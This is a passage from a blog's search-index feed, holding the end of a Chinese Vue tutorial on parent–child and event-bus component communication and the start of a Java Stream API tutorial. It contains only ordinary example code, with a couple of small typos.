class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure><br>Child.vue<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h3&gt;Child&lt;&#x2F;h3&gt;</span><br><span class="line">    &lt;h5&gt;&#123;&#123;msg&#125;&#125;&lt;&#x2F;h5&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  props: &#123;</span><br><span class="line">    msg: &#123;</span><br><span class="line">      type: String,</span><br><span class="line">      default: &quot;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure></p><p>传值结果:<br><img src="/img/vue/vue1.PNG" alt="父组件传值prop接收"></p><p>子组件通过$emit传值给父组件<br>Parent.vue<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h1&gt;Parent&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;h3&gt;&#123;&#123;msg&#125;&#125;&lt;&#x2F;h3&gt;</span><br><span class="line">    &lt;my-child v-bind:msg&#x3D;&quot;&#39;form Parent msg&#39;&quot; @showMsg&#x3D;&quot;showMsg&quot;&gt;&lt;&#x2F;my-child&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import MyChild from &quot;.&#x2F;Child&quot;;</span><br><span class="line">export default &#123;</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      msg: &#39;&#39;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    MyChild</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    showMsg(val) &#123;</span><br><span class="line">      this.msg &#x3D; val</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure></p><p>Child.vue<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div&gt;</span><br><span class="line">    &lt;h3&gt;Child&lt;&#x2F;h3&gt;</span><br><span class="line">    &lt;h5&gt;&#123;&#123;msg&#125;&#125;&lt;&#x2F;h5&gt;</span><br><span class="line">    &lt;button @click&#x3D;&quot;passMsg&quot;&gt;向父组件传值&lt;&#x2F;button&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  props: &#123;</span><br><span class="line">    msg: &#123;</span><br><span class="line">      type: String,</span><br><span class="line">      default: &quot;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    passMsg() &#123;</span><br><span class="line">      this.$emit(&#39;showMsg&#39;, &#39;i am from child&#39;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure></p><p>传值结果:<br><img src="/img/vue/vue2.PNG" alt="子组件$emit传值"><br><img src="/img/vue/vue3.PNG" alt="子组件$emit传值"></p><h3 id="parent-children-ref"><a href="#parent-children-ref" class="headerlink" title="$parent / children $ref"></a>$parent / children $ref</h3><p>⼦组件中通过this.$parent这个对象获取⽗组件中的数据<br>⽗组件中通过this.$children这个数组获取⼦组件中的数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mounted() &#123;</span><br><span class="line">  console.log(this.$children)</span><br><span class="line">  console.log(&#39;ref&#39;,this.$res.child)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="⾮⽗⼦间传值"><a href="#⾮⽗⼦间传值" class="headerlink" title="⾮⽗⼦间传值"></a>⾮⽗⼦间传值</h2><h3 id="事件总线"><a href="#事件总线" class="headerlink" title="事件总线"></a>事件总线</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 原理上就是建⽴⼀个公共的js⽂件，专⻔⽤来传递消息</span><br><span class="line">&#x2F;&#x2F; bus.js</span><br><span class="line">import Vue from &#39;vue&#39;</span><br><span class="line">export default new Vue;</span><br><span class="line">&#x2F;&#x2F; 在需要传递消息的地⽅引⼊</span><br><span class="line">import bus from &#39;.&#x2F;bus.js&#39;</span><br><span class="line">&#x2F;&#x2F; 传递消息</span><br><span class="line">bus.$emit(&#39;msg&#39;, val)</span><br><span class="line">&#x2F;&#x2F; 接受消息</span><br><span class="line">bus.$emit(&#39;msg&#39;, val &#x3D;&gt; &#123;</span><br><span class="line"> console.log(val)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>App.vue<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &lt;button @click&#x3D;&quot;passMsg&quot;&gt;非父子传值App-&gt;Child&lt;&#x2F;button&gt;</span><br><span class="line">    </span><br><span class="line">    &lt;router-view&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">import bus from &#39;.&#x2F;util&#x2F;bus&#39;</span><br><span class="line">  export default &#123;</span><br><span class="line">    methods: &#123;</span><br><span class="line">      passMsg() &#123;</span><br><span class="line">        bus.$emit(&#39;msg&#39;,&#39;this is from App&#39;)      </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,  </span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></p><p>Child.vue<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;child&quot;&gt;</span><br><span class="line">    &lt;h2&gt;This is a child page&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;h3&gt;&#123;&#123;msg&#125;&#125;&lt;&#x2F;h3&gt;</span><br><span class="line">    &lt;h4&gt;&#123;&#123;childMsg&#125;&#125;&lt;&#x2F;h4&gt;</span><br><span class="line">    &lt;button @click&#x3D;&quot;passtoParent&quot;&gt;子向父传值&lt;&#x2F;button&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">import bus from &#39;..&#x2F;util&#x2F;bus&#39;</span><br><span class="line">  export default &#123;</span><br><span class="line">    &#x2F;&#x2F;父向子传值</span><br><span class="line">    props:&#123;</span><br><span class="line">      msg:&#123;</span><br><span class="line">        type:String,</span><br><span class="line">        default:&#39;&#39;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    data() &#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        childMsg: &#39;childMsg&#39;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">      passtoParent()&#123;</span><br><span class="line">        this.$emit(&#39;showMsg&#39;,&#39;this is from child&#39;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    mounted () &#123;</span><br><span class="line">      &#x2F;&#x2F; bus.$on监听</span><br><span class="line">      bus.$on(&#39;msg&#39;,(val)&#x3D;&gt;&#123;</span><br><span class="line">        this.childMsg&#x3D;val</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;style lang&#x3D;&quot;css&quot; scoped&gt;</span><br><span class="line">  .child&#123;</span><br><span class="line">     background-color:red;</span><br><span class="line">  &#125;     </span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure></p><h3 id="attrs-listeners"><a href="#attrs-listeners" class="headerlink" title="$attrs / $listeners"></a>$attrs / $listeners</h3><p>App.vue<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div id&#x3D;&quot;app&quot;&gt;</span><br><span class="line">    &lt;button @click&#x3D;&quot;passMsg&quot;&gt;非父子传值App-&gt;Child&lt;&#x2F;button&gt;</span><br><span class="line">    &lt;Parent :msg&#x3D;&#39;a&#39; :msg2&#x3D;&#39;b&#39; :msg3&#x3D;&#39;c&#39;&gt;&lt;&#x2F;Parent&gt;&#x2F;&#x2F;改动</span><br><span class="line">    &lt;router-view&#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import bus from &#39;.&#x2F;util&#x2F;bus&#39;</span><br><span class="line">import Parent from &#39;.&#x2F;views&#x2F;Parent&#39;</span><br><span class="line">  export default &#123;</span><br><span class="line">  &#x2F;&#x2F;改动</span><br><span class="line">    data() &#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        a: &#39;msga&#39;,</span><br><span class="line">        b: &#39;msgb&#39;,</span><br><span class="line">        c: &#39;msgc&#39;,</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    components:&#123;</span><br><span class="line">      Parent</span><br><span class="line">    &#125;,</span><br><span class="line">    methods: &#123;</span><br><span class="line">      passMsg() &#123;</span><br><span class="line">        bus.$emit(&#39;msg&#39;,&#39;this is from App&#39;)</span><br><span class="line">        </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></p><p>Child.vue<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;child&quot;&gt;</span><br><span class="line">    &lt;h2&gt;This is a child page&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;h3&gt;&#123;&#123;msg&#125;&#125;&lt;&#x2F;h3&gt;</span><br><span class="line">    &lt;h4&gt;&#123;&#123;childMsg&#125;&#125;&lt;&#x2F;h4&gt;</span><br><span class="line">    &lt;button @click&#x3D;&quot;passtoParent&quot;&gt;子向父传值&lt;&#x2F;button&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import bus from &#39;..&#x2F;util&#x2F;bus&#39;</span><br><span class="line">  export default &#123;</span><br><span class="line">    &#x2F;&#x2F;父向子传值</span><br><span class="line">    props:&#123;</span><br><span class="line">      msg:&#123;</span><br><span class="line">        type:String,</span><br><span class="line">        default:&#39;&#39;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    data() &#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        childMsg: &#39;childMsg&#39;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    methods:&#123;</span><br><span class="line">      passtoParent()&#123;</span><br><span class="line">        this.$emit(&#39;showMsg&#39;,&#39;this is from child&#39;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    mounted () &#123;</span><br><span class="line">      &#x2F;&#x2F;改动</span><br><span class="line">      console.log(&#39;attrs&#39;,this.$attrs),</span><br><span class="line">      &#x2F;&#x2F; bus.$on监听</span><br><span class="line">      bus.$on(&#39;msg&#39;,(val)&#x3D;&gt;&#123;</span><br><span class="line">        this.childMsg&#x3D;val</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style lang&#x3D;&quot;css&quot; scoped&gt;</span><br><span class="line">  .child&#123;</span><br><span class="line">     background-color:red;</span><br><span class="line">  &#125;</span><br><span class="line">      </span><br><span class="line">&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure></p><p>Pqarent.vue<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;parent&quot;&gt;</span><br><span class="line">    &lt;div&gt;this is a parent page&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;h1&gt;&#123;&#123;msg&#125;&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;!-- 改动--&gt;</span><br><span class="line">    &lt;Child v-bind:msg&#x3D;&quot;&#39;from parent&#39;&quot; @showMsg&#x3D;&quot;showMsg1&quot; ref&#x3D;&quot;child&quot; v-bind&#x3D;&quot;$attrs&quot;&gt;&lt;&#x2F;Child&gt;</span><br><span class="line">    &lt;!-- @showMsg&#x3D;&quot;showMsg1&quot;监听事件 --&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Child from &#39;.&#x2F;Child&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">export default &#123;</span><br><span class="line">  data()&#123;</span><br><span class="line">    return&#123;</span><br><span class="line">      msg:&#39;&#39;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;,</span><br><span class="line">  components: &#123;</span><br><span class="line">    Child</span><br><span class="line">  &#125;,</span><br><span class="line">  methods:&#123;</span><br><span class="line">    showMsg1(val)&#123;</span><br><span class="line">      this.msg&#x3D;val</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted () &#123;</span><br><span class="line">    console.log(this.$children[0].childMsg);</span><br><span class="line">    console.log(&#39;ref&#39;,this.$refs.child)</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> vue </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javastream流</title>
      <link href="/2020/12/25/stream%E6%B5%81/"/>
      <url>/2020/12/25/stream%E6%B5%81/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在工作过程中看到类似以下代码，一时间理解不能，static void方法中有return方法，后续意识到这应该是stream流的拦截处理，特此记录巩固java stream的写法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;** 获取结案操作逻辑处理*&#x2F;</span><br><span class="line">private static void getXXXXByEnum(List&lt;Enum&gt; enumList, Entity entity, List&lt;String&gt; list) &#123;</span><br><span class="line">    enumList.forEach(enum -&gt; &#123;</span><br><span class="line">        for (Map&lt;String, Object&gt; mapItem : enum.getRule()) &#123;</span><br><span class="line">            List&lt;String&gt; collect &#x3D; mapItem.entrySet().stream().filter(item -&gt; &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    return (item.getValue() instanceof String &amp;&amp;</span><br><span class="line">                            (item.getValue()).equals(ReflectUtil.getFieldValue(entity, item.getKey())))</span><br><span class="line">                            ||</span><br><span class="line">                            (item.getValue() instanceof List &amp;&amp;</span><br><span class="line">                                    ((List&lt;String&gt;) item.getValue()).contains(ReflectUtil.getFieldValue(entity, item.getKey())));</span><br><span class="line">                &#125; catch (NoSuchMethodException | IllegalAccessException | InvocationTargetException e) &#123;</span><br><span class="line">                    log.error(&quot;获取字段：&#123;&#125; 出错&quot;, item.getKey());</span><br><span class="line">                    return false;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).map(Map.Entry::getKey).collect(Collectors.toList());</span><br><span class="line">            if (mapItem.size() &#x3D;&#x3D; collect.size()) &#123;</span><br><span class="line">                list.add(enum.getXXXXX());</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="什么是-Stream？"><a href="#什么是-Stream？" class="headerlink" title="什么是 Stream？"></a>什么是 Stream？</h4><p>Stream（流）是一个来自数据源的元素队列并支持聚合操作</p><ul><li>元素是特定类型的对象，形成一个队列。 Java中的Stream并不会存储元素，而是按需计算。</li><li>数据源 流的来源。 可以是集合，数组，I/O channel， 产生器generator 等。</li><li><p>聚合操作 类似SQL语句一样的操作， 比如filter, map, reduce, find, match, sorted等。<br>和以前的Collection操作不同， Stream操作还有两个基础的特征：</p></li><li><p>Pipelining: 中间操作都会返回流对象本身。 这样多个操作可以串联成一个管道， 如同流式风格（fluent style）。 这样做可以对操作进行优化， 比如延迟执行(laziness)和短路( short-circuiting)。</p></li><li>内部迭代： 以前对集合遍历都是通过Iterator或者For-Each的方式, 显式的在集合外部进行迭代， 这叫做外部迭代。 Stream提供了内部迭代的方式， 通过访问者模式(Visitor)实现。</li></ul><h4 id="生成流"><a href="#生成流" class="headerlink" title="生成流"></a>生成流</h4><p>在 Java 8 中, 集合接口有两个方法来生成流：</p><ul><li><p>stream() − 为集合创建串行流。</p></li><li><p>parallelStream() − 为集合创建并行流。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; strings &#x3D; Arrays.asList(&quot;abc&quot;, &quot;&quot;, &quot;bc&quot;, &quot;efg&quot;, &quot;abcd&quot;,&quot;&quot;, &quot;jkl&quot;);</span><br><span class="line">List&lt;String&gt; filtered &#x3D; strings.stream().filter(string -&gt; !string.isEmpty()).collect(Collectors.toList());</span><br></pre></td></tr></table></figure><h4 id="forEach"><a href="#forEach" class="headerlink" title="forEach"></a>forEach</h4><p>Stream 提供了新的方法 ‘forEach’ 来迭代流中的每个数据。以下代码片段使用 forEach 输出了10个随机数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Random random &#x3D; new Random();</span><br><span class="line">random.ints().limit(10).forEach(System.out::println);</span><br></pre></td></tr></table></figure><h4 id="map"><a href="#map" class="headerlink" title="map"></a>map</h4><p>map 方法用于映射每个元素到对应的结果，以下代码片段使用 map 输出了元素对应的平方数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;Integer&gt; numbers &#x3D; Arrays.asList(3, 2, 2, 3, 7, 3, 5);</span><br><span class="line">&#x2F;&#x2F; 获取对应的平方数</span><br><span class="line">List&lt;Integer&gt; squaresList &#x3D; numbers.stream().map( i -&gt; i*i).distinct().collect(Collectors.toList());</span><br></pre></td></tr></table></figure><h4 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h4><p>filter 方法用于通过设置的条件过滤出元素。以下代码片段使用 filter 方法过滤出空字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt;strings &#x3D; Arrays.asList(&quot;abc&quot;, &quot;&quot;, &quot;bc&quot;, &quot;efg&quot;, &quot;abcd&quot;,&quot;&quot;, &quot;jkl&quot;);</span><br><span class="line">&#x2F;&#x2F; 获取空字符串的数量</span><br><span class="line">long count &#x3D; strings.stream().filter(string -&gt; string.isEmpty()).count();</span><br></pre></td></tr></table></figure><h4 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h4><p>limit 方法用于获取指定数量的流。 以下代码片段使用 limit 方法打印出 10 条数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Random random &#x3D; new Random();</span><br><span class="line">random.ints().limit(10).forEach(System.out::println);</span><br></pre></td></tr></table></figure><h4 id="sorted"><a href="#sorted" class="headerlink" title="sorted"></a>sorted</h4><p>sorted 方法用于对流进行排序。以下代码片段使用 sorted 方法对输出的 10 个随机数进行排序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Random random &#x3D; new Random();</span><br><span class="line">random.ints().limit(10).sorted().forEach(System.out::println);</span><br></pre></td></tr></table></figure><h4 id="并行（parallel）程序"><a href="#并行（parallel）程序" class="headerlink" title="并行（parallel）程序"></a>并行（parallel）程序</h4><p>parallelStream 是流并行处理程序的代替方法。以下实例我们使用 parallelStream 来输出空字符串的数量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt; strings &#x3D; Arrays.asList(&quot;abc&quot;, &quot;&quot;, &quot;bc&quot;, &quot;efg&quot;, &quot;abcd&quot;,&quot;&quot;, &quot;jkl&quot;);</span><br><span class="line">&#x2F;&#x2F; 获取空字符串的数量</span><br><span class="line">long count &#x3D; strings.parallelStream().filter(string -&gt; string.isEmpty()).count();</span><br></pre></td></tr></table></figure><h4 id="Collectors"><a href="#Collectors" class="headerlink" title="Collectors"></a>Collectors</h4><p>Collectors 类实现了很多归约操作，例如将流转换成集合和聚合元素。Collectors 可用于返回列表或字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">List&lt;String&gt;strings &#x3D; Arrays.asList(&quot;abc&quot;, &quot;&quot;, &quot;bc&quot;, &quot;efg&quot;, &quot;abcd&quot;,&quot;&quot;, &quot;jkl&quot;);</span><br><span class="line">List&lt;String&gt; filtered &#x3D; strings.stream().filter(string -&gt; !string.isEmpty()).collect(Collectors.toList());</span><br><span class="line"> </span><br><span class="line">System.out.println(&quot;筛选列表: &quot; + filtered);</span><br><span class="line">String mergedString &#x3D; strings.stream().filter(string -&gt; !string.isEmpty()).collect(Collectors.joining(&quot;, &quot;));</span><br><span 